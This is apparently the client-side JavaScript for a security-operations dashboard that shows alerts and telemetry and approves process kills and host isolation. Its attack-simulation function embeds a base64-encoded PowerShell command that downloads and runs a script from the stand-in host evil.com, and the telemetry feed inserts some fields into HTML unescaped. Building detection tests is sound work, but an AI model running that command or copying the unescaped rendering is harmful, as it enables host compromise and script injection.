/**
 * AegisXDR-Enterprise SOC Dashboard Client Controller v2.0
 * Manages live feeds, Root Cause Analysis modals, 5-minute Timeline streams,
 * secondary action confirmation popups, and SOAR mitigation approvals.
 */

let alertChart = null;
let telemetryChart = null;
let currentSeverityFilter = 'ALL';
let pendingActionHandler = null;

document.addEventListener('DOMContentLoaded', () => {
    // Initialize Charts
    initCharts();

    // Initial Data Load & Polling Interval
    loadDashboardData();
    setInterval(loadDashboardData, 3000);

    // Event Listeners for Severity Filter Buttons
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            document.querySelectorAll('.filter-btn').forEach(b => {
                b.classList.remove('bg-blue-600', 'text-white');
                b.classList.add('bg-slate-800', 'text-slate-400');
            });
            
            e.target.classList.remove('bg-slate-800', 'text-slate-400');
            e.target.classList.add('bg-blue-600', 'text-white');

            currentSeverityFilter = e.target.getAttribute('data-severity');
            loadAlerts();
        });
    });

    // Action Header Buttons
    document.getElementById('btn-simulate-attack')?.addEventListener('click', runAttackSimulation);
    document.getElementById('btn-manual-isolate')?.addEventListener('click', promptManualIsolate);
    document.getElementById('btn-manual-kill')?.addEventListener('click', promptManualKill);
    document.getElementById('btn-modal-confirm-action')?.addEventListener('click', executeConfirmedAction);
});

function initCharts() {
    // 1. Severity Doughnut Chart
    const ctxAlert = document.getElementById('alertSeverityChart')?.getContext('2d');
    if (ctxAlert) {
        alertChart = new Chart(ctxAlert, {
            type: 'doughnut',
            data: {
                labels: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
                datasets: [{
                    data: [0, 0, 0, 0],
                    backgroundColor: ['#ef4444', '#f59e0b', '#eab308', '#3b82f6'],
                    borderWidth: 0
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { position: 'bottom', labels: { color: '#94a3b8', font: { family: 'Inter', size: 11 } } }
                },
                cutout: '70%'
            }
        });
    }

    // 2. Telemetry Line Chart
    const ctxTel = document.getElementById('telemetryTimelineChart')?.getContext('2d');
    if (ctxTel) {
        telemetryChart = new Chart(ctxTel, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Ingestion Stream',
                    data: [],
                    borderColor: '#06b6d4',
                    backgroundColor: 'rgba(6, 182, 212, 0.1)',
                    fill: true,
                    tension: 0.4,
                    borderWidth: 2
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                scales: {
                    x: { ticks: { color: '#64748b' }, grid: { display: false } },
                    y: { ticks: { color: '#64748b' }, grid: { color: 'rgba(255,255,255,0.05)' } }
                },
                plugins: { legend: { display: false } }
            }
        });
    }
}

async function loadDashboardData() {
    await Promise.all([
        loadStats(),
        loadAlerts(),
        loadTelemetry(),
        loadSoarLogs()
    ]);
}

async function loadStats() {
    try {
        const res = await fetch('/api/v1/stats');
        if (!res.ok) return;
        const data = await res.json();

        document.getElementById('stat-total-events').innerText = data.total_telemetry_events.toLocaleString();
        document.getElementById('stat-total-alerts').innerText = data.total_alerts.toLocaleString();
        document.getElementById('stat-critical-alerts').innerText = data.critical_alerts.toLocaleString();
        document.getElementById('stat-soar-actions').innerText = data.soar_actions_executed.toLocaleString();

        if (alertChart) {
            alertChart.data.datasets[0].data = [
                data.critical_alerts,
                data.high_alerts,
                Math.max(0, data.total_alerts - (data.critical_alerts + data.high_alerts)),
                0
            ];
            alertChart.update();
        }
    } catch (e) {
        console.error("Error loading stats:", e);
    }
}

async function loadAlerts() {
    try {
        let url = '/api/v1/alerts?limit=50';
        if (currentSeverityFilter !== 'ALL') {
            url += `&severity=${currentSeverityFilter}`;
        }
        const res = await fetch(url);
        if (!res.ok) return;
        const alerts = await res.json();

        const tbody = document.getElementById('alerts-tbody');
        if (!tbody) return;

        if (alerts.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" class="px-4 py-8 text-center text-slate-500">No security alerts matching filter criteria.</td></tr>`;
            return;
        }

        tbody.innerHTML = alerts.map(a => {
            const badgeClass = a.severity === 'CRITICAL' ? 'badge-critical' :
                               a.severity === 'HIGH' ? 'badge-high' :
                               a.severity === 'MEDIUM' ? 'badge-medium' : 'badge-low';

            const timeStr = a.timestamp ? new Date(a.timestamp).toLocaleTimeString() : 'N/A';

            let actionButtonHtml = '';
            if (a.soar_triggered) {
                actionButtonHtml = `<span class="px-2 py-1 rounded bg-emerald-950/80 text-emerald-400 border border-emerald-800 text-[11px]"><i class="lucide-shield-check inline-block w-3 h-3 mr-1"></i>SOAR Mitigated</span>`;
            } else if (a.status === 'PENDING_APPROVAL') {
                actionButtonHtml = `<button onclick="event.stopPropagation(); promptApproveAction(${a.id}, ${a.pid}, '${escapeHtml(a.process_name)}', '${escapeHtml(a.hostname)}')" class="px-2 py-1 bg-amber-600/30 hover:bg-amber-600 text-amber-300 border border-amber-500 rounded text-[11px] font-semibold transition-colors">Approve Action</button>`;
            } else {
                actionButtonHtml = `<button onclick="event.stopPropagation(); promptKillProcessAction(${a.id}, ${a.pid}, '${escapeHtml(a.process_name)}')" class="px-2 py-1 bg-red-900/40 hover:bg-red-800 text-red-300 border border-red-700/50 rounded text-[11px] transition-colors">Kill Process</button>`;
            }

            return `
                <tr onclick="openDetailModal(${a.id})" class="border-b border-slate-800/60 hover:bg-slate-800/50 transition-colors cursor-pointer">
                    <td class="px-4 py-3 text-xs text-slate-400 mono">${timeStr}</td>
                    <td class="px-4 py-3">
                        <span class="px-2 py-0.5 rounded text-xs font-semibold ${badgeClass}">${a.severity}</span>
                    </td>
                    <td class="px-4 py-3 text-sm font-medium text-slate-200">
                        ${escapeHtml(a.rule_title)}
                        <div class="text-xs text-slate-500 font-mono mt-0.5">${escapeHtml(a.rule_id)} • ${escapeHtml(a.mitre_technique || '')}</div>
                    </td>
                    <td class="px-4 py-3 text-xs text-slate-300 mono">${escapeHtml(a.hostname)}</td>
                    <td class="px-4 py-3 text-xs text-slate-300 mono">
                        <span class="text-slate-400">${escapeHtml(a.parent_name || 'N/A')}</span> 
                        <span class="text-cyan-400">➔</span> 
                        <span class="text-cyan-300 font-bold">${escapeHtml(a.process_name)}</span> (PID: ${a.pid})
                        <div class="text-[10px] text-slate-500 truncate max-w-xs mt-0.5">${escapeHtml(a.cmdline || '')}</div>
                    </td>
                    <td class="px-4 py-3 text-xs text-right">
                        ${actionButtonHtml}
                    </td>
                </tr>
            `;
        }).join('');
    } catch (e) {
        console.error("Error loading alerts:", e);
    }
}

async function loadTelemetry() {
    try {
        const res = await fetch('/api/v1/telemetry?limit=15');
        if (!res.ok) return;
        const logs = await res.json();

        const feed = document.getElementById('telemetry-feed');
        if (!feed) return;

        feed.innerHTML = logs.map(l => `
            <div class="p-2.5 rounded bg-slate-900/60 border border-slate-800/80 text-xs font-mono flex items-center justify-between">
                <div class="flex items-center space-x-2 truncate">
                    <span class="text-cyan-400 font-semibold">[${l.hostname}]</span>
                    <span class="text-slate-300">${l.parent_name || 'sys'} ➔ <span class="text-yellow-400 font-bold">${l.process_name}</span></span>
                    <span class="text-slate-500 text-[11px]">PID:${l.pid}</span>
                </div>
                <div class="flex items-center space-x-2">
                    ${l.is_encrypted ? `<span class="text-[10px] px-1.5 py-0.5 rounded bg-blue-950 text-blue-400 border border-blue-800">AES-256</span>` : ''}
                    <span class="text-slate-500 text-[10px]">${l.timestamp ? new Date(l.timestamp).toLocaleTimeString() : ''}</span>
                </div>
            </div>
        `).join('');

        if (telemetryChart) {
            const now = new Date().toLocaleTimeString();
            telemetryChart.data.labels.push(now);
            telemetryChart.data.datasets[0].data.push(logs.length);
            if (telemetryChart.data.labels.length > 10) {
                telemetryChart.data.labels.shift();
                telemetryChart.data.datasets[0].data.shift();
            }
            telemetryChart.update();
        }
    } catch (e) {
        console.error("Error loading telemetry:", e);
    }
}

async function loadSoarLogs() {
    try {
        const res = await fetch('/api/v1/soar/actions?limit=10');
        if (!res.ok) return;
        const actions = await res.json();

        const container = document.getElementById('soar-audit-feed');
        if (!container) return;

        if (actions.length === 0) {
            container.innerHTML = `<div class="text-xs text-slate-500 text-center py-4">No SOAR mitigation actions recorded yet.</div>`;
            return;
        }

        container.innerHTML = actions.map(act => `
            <div class="p-2.5 rounded bg-emerald-950/20 border border-emerald-800/40 text-xs flex items-center justify-between">
                <div>
                    <div class="font-semibold text-emerald-400 flex items-center">
                        <span class="w-2 h-2 rounded-full bg-emerald-500 inline-block mr-2"></span>
                        ${act.action_type} - ${act.target_host}
                    </div>
                    <div class="text-slate-400 text-[11px] mt-0.5">${escapeHtml(act.details)}</div>
                </div>
                <span class="text-[10px] text-slate-500 mono">${act.timestamp ? new Date(act.timestamp).toLocaleTimeString() : ''}</span>
            </div>
        `).join('');
    } catch (e) {
        console.error("Error loading SOAR logs:", e);
    }
}

/* ==================== ALERT DETAIL & ROOT CAUSE MODAL ==================== */

async function openDetailModal(alertId) {
    const modal = document.getElementById('alert-detail-modal');
    modal.classList.remove('hidden');

    document.getElementById('modal-alert-title').innerText = `Alert Root Cause & Forensic Timeline (Alert ID #${alertId})`;
    document.getElementById('modal-root-cause-text').innerText = 'Loading Root Cause Analysis...';
    document.getElementById('modal-process-tree').innerHTML = 'Loading process tree...';
    document.getElementById('modal-timeline-list').innerHTML = 'Loading 5-minute timeline...';
    document.getElementById('modal-raw-json').innerText = 'Loading telemetry JSON...';

    try {
        // 1. Fetch Root Cause Analysis
        const rcRes = await fetch(`/api/v1/alerts/${alertId}/root-cause`);
        if (rcRes.ok) {
            const rcData = await rcRes.json();
            document.getElementById('modal-root-cause-text').innerText = rcData.root_cause_summary;

            const pt = rcData.process_tree;
            document.getElementById('modal-process-tree').innerHTML = `
                <div class="text-slate-400">└─ Parent Process: <span class="text-yellow-400 font-bold">${escapeHtml(pt.parent.name)}</span></div>
                <div class="pl-6 text-slate-300">└─ Target Process: <span class="text-cyan-400 font-bold">${escapeHtml(pt.target_process.name)}</span> (PID: ${pt.target_process.pid})</div>
                <div class="pl-12 text-slate-500 text-[11px]">Command Line: ${escapeHtml(pt.target_process.cmdline)}</div>
            `;

            document.getElementById('modal-raw-json').innerText = JSON.stringify(rcData.raw_alert_data, null, 2);
        }

        // 2. Fetch Timeline Data
        const tlRes = await fetch(`/api/v1/alerts/${alertId}/timeline`);
        if (tlRes.ok) {
            const tlData = await tlRes.json();
            if (tlData.length === 0) {
                document.getElementById('modal-timeline-list').innerHTML = `<div class="text-slate-500">No correlated events in timeline window.</div>`;
            } else {
                document.getElementById('modal-timeline-list').innerHTML = tlData.map(t => {
                    const highlight = t.is_target_alert_event ? 'bg-red-950/60 border border-red-800 text-red-300 font-bold' : 'bg-slate-900 border border-slate-800 text-slate-300';
                    return `
                        <div class="p-2 rounded ${highlight} flex items-center justify-between">
                            <div>
                                <span class="text-slate-400">[${new Date(t.timestamp).toLocaleTimeString()}]</span>
                                <span class="ml-2">${escapeHtml(t.parent_name || 'sys')} ➔ <span class="text-cyan-300">${escapeHtml(t.process_name)}</span> (PID: ${t.pid})</span>
                            </div>
                            <span class="text-[10px] text-slate-500 truncate max-w-xs">${escapeHtml(t.cmdline)}</span>
                        </div>
                    `;
                }).join('');
            }
        }
    } catch (e) {
        console.error("Error opening detail modal:", e);
    }
}

function closeDetailModal() {
    document.getElementById('alert-detail-modal').classList.add('hidden');
}

/* ==================== SECONDARY CONFIRMATION MODAL ==================== */

function openConfirmModal(title, desc, confirmCallback) {
    document.getElementById('confirm-modal-title').innerText = title;
    document.getElementById('confirm-modal-desc').innerText = desc;
    pendingActionHandler = confirmCallback;
    document.getElementById('action-confirm-modal').classList.remove('hidden');
}

function closeConfirmModal() {
    document.getElementById('action-confirm-modal').classList.add('hidden');
    pendingActionHandler = null;
}

function executeConfirmedAction() {
    if (pendingActionHandler) {
        pendingActionHandler();
    }
    closeConfirmModal();
}

function promptKillProcessAction(alertId, pid, processName) {
    openConfirmModal(
        "Confirm Process Termination",
        `Are you sure you want to kill process '${processName}' (PID: ${pid})? This will send an immediate termination signal.`,
        async () => {
            try {
                const res = await fetch('/api/v1/soar/kill-process', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ pid, process_name: processName })
                });
                const data = await res.json();
                alert(`Process Termination Result:\nStatus: ${data.status}\nMessage: ${data.message}`);
                loadDashboardData();
            } catch (e) {
                alert("Error killing process: " + e);
            }
        }
    );
}

function promptApproveAction(alertId, pid, processName, hostname) {
    openConfirmModal(
        "Approve Pending SOAR Mitigation",
        `Approve SOAR mitigation action for Alert #${alertId} on host '${hostname}' (PID: ${pid})?`,
        async () => {
            try {
                const res = await fetch('/api/v1/soar/approve', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ alert_id: alertId, pid, process_name: processName, hostname, action_type: 'PROCESS_KILL' })
                });
                const data = await res.json();
                alert(`SOAR Approval Result:\nStatus: ${data.status}\nMessage: ${data.message}`);
                loadDashboardData();
            } catch (e) {
                alert("Error approving action: " + e);
            }
        }
    );
}

function promptManualIsolate() {
    const hostname = prompt("Enter target Hostname to isolate:", "FINANCE-DC-01");
    if (!hostname) return;

    openConfirmModal(
        "Confirm Host Network Isolation",
        `Are you sure you want to isolate host '${hostname}' from the network? All non-SIEM network interfaces will be blocked.`,
        async () => {
            try {
                const res = await fetch('/api/v1/soar/isolate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ hostname })
                });
                const data = await res.json();
                alert(`Host Isolation Result:\nStatus: ${data.status}\nDetails: ${data.details}`);
                loadSoarLogs();
            } catch (e) {
                alert("Error isolating host: " + e);
            }
        }
    );
}

function promptManualKill() {
    const pidStr = prompt("Enter target Process PID to kill:", "7120");
    if (!pidStr) return;
    const pid = parseInt(pidStr, 10);
    if (isNaN(pid)) return alert("Invalid PID");

    promptKillProcessAction(null, pid, "user-selected-process");
}

async function runAttackSimulation() {
    const btn = document.getElementById('btn-simulate-attack');
    btn.disabled = true;
    btn.innerText = 'Transmitting Attack...';

    try {
        const attackPayload = {
            "agent_id": "AEGIS-SIM-AGENT",
            "hostname": "FINANCE-DC-01",
            "ip_address": "10.0.4.12",
            "timestamp": new Date().toISOString(),
            "pid": 7120,
            "process_name": "powershell.exe",
            "ppid": 1044,
            "parent_name": "wmiprvse.exe",
            "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
            "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "encrypted": false
        };

        const res = await fetch('/api/v1/telemetry', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(attackPayload)
        });

        if (res.ok) {
            const data = await res.json();
            alert(`[!] Advanced Threat Attack Transmitted!\nAlerts Generated: ${data.alerts_generated}`);
            loadDashboardData();
        } else {
            alert('Failed to transmit simulated attack.');
        }
    } catch (e) {
        alert('Error simulating attack: ' + e);
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<i class="lucide-zap inline-block w-4 h-4 mr-1"></i>Simulate Attack`;
    }
}

function escapeHtml(str) {
    if (!str) return '';
    return str
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
